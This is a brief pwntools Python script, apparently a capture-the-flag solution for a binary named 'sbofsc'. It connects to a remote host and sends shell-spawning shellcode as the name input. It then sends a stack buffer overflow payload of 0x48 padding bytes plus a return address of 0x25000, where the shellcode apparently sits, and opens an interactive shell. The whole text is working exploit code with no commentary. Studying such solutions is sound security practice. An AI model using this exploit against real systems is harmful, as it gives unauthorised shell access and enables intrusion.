from pwn import *
import random
context.log_level ='DEBUG'
context.arch = 'x86_64'
#p = process('./sbofsc')
p = remote("10.194.164.30","58845")
shellcode = asm(shellcraft.sh())
map_addr = 0x25000
p.sendlineafter(b"what's your name: ", shellcode)
padding = b'A' * 0x48
payload = padding + p64(map_addr)
p.sendlineafter(b"try to overflow me~", payload)
p.interactive()